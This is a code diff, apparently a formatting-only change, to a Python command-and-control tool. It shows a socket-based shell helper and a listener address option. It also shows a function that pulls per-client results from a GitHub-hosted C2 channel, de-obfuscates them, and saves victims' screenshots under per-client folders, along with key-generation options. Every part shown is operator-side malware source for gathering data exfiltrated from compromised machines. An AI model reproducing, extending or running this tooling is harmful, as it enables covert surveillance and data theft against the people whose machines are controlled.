@@ -11,7 +11,6 @@ import socket
 
 
 class ShellHelper:
-
     def __init__(self, args: argparse.Namespace) -> None:
         self.__readBuffer, _, _ = select([], [], [], 0)
         self.__cSoc: socket.socket
@@ -89,14 +88,19 @@ class ShellHelper:
 
 class CustomProcessors:
     @staticmethod
-    def processImage(filePath: str,client: str, sneak: str) -> None:
+    def processImage(filePath: str, client: str, sneak: str) -> None:
         with open(filePath) as f:
             con = f.read()
         con = obfuscation.DSNEAKS[sneak](con)
         imgData = bytes(bytearray.fromhex(con))
-        print("[ii]: Screenshot written to {}/screenshots/{}.jpg".format(client,filePath.split("/")[-1]))
+        print(
+            "[ii]: Screenshot written to {}/screenshots/{}.jpg".format(
+                client, filePath.split("/")[-1]
+            )
+        )
         with open(
-            "results/{}/screenshots/{}.jpg".format(client,filePath.split("/")[-1]), "wb"
+            "results/{}/screenshots/{}.jpg".format(client, filePath.split("/")[-1]),
+            "wb",
         ) as f:
             f.write(imgData)
 
@@ -127,11 +131,15 @@ def processFromGithubC2(repo: str, sneak: str) -> None:
                     for res in os.listdir("c2stuff/{}/00_results".format(client)):
                         if res.startswith("screenshot"):
                             CustomProcessors.processImage(
-                                "c2stuff/{}/00_results/{}".format(client,res), client, sneak
+                                "c2stuff/{}/00_results/{}".format(client, res),
+                                client,
+                                sneak,
                             )
                         else:
                             context = res.split("_")[-2]
-                            with open("c2stuff/{}/00_results/{}".format(client,res)) as f:
+                            with open(
+                                "c2stuff/{}/00_results/{}".format(client, res)
+                            ) as f:
                                 cons = f.read()
                             if result.get(context) == None:
                                 result[context] = obfuscation.DSNEAKS[sneak](cons)
@@ -196,7 +204,11 @@ if __name__ == "__main__":
         "-g", "--generatekey", action="store_true", help="For generating keys prior"
     )
     parser.add_argument(
-        "-ks", "--keysize", type=int, default=128, help="Key size for generation. Default 128 bits"
+        "-ks",
+        "--keysize",
+        type=int,
+        default=128,
+        help="Key size for generation. Default 128 bits",
     )
     parser.add_argument("-a", "--addr", type=str, help="Address to bind the listener")
     args = parser.parse_args()
